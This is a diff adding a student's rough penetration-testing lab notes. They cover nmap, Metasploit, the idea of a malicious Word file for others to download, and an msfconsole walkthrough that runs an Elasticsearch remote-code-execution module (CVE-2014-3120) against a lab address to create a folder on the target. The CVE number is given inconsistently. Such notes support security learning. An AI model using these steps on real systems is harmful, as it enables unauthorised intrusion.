@@ -1,0 +1,35 @@
+Hardware ssecurity
+  ex. CPU
+  >>Apache is an open source
+  
+  Big Problem: Remote Code Execution
+  -------------------------------------------
+  Words attack:
+  Use metasploit to make a "bad Words" for others to download
+  -------------------------------------------
+  TODAY WORKS:
+  USING KALI LINUX TO ATTACK METASPLOIT
+  --------------------------
+  Penetrstion Test (PT)
+  > nmap
+    -> nmap.org
+  > metasploit
+    -> https://zh.wikipedia.org/wiki/Metasploit
+  > msfconsole
+  ----------------------------------------------------
+  CVE Details
+  
+  ----------------------------------------------------
+  make a folder in others' C:/
+  STEPs:
+  >tool: msfconsole
+  >commands: search elasticsearch
+             -> seach CVE-2014-3120
+             -> use exploit/elasticsearch/script_mvel_rce (words at the back of "use" is not a command, you can find it after the command "search CVE-2017-3120")
+             -> show options
+             -> set RHOST 10.0.2.4 (attacked ip)
+             -> exploit
+             -> then you can make the folder on the target compture!
+  
+  command:
+  PWD -> to know where you are
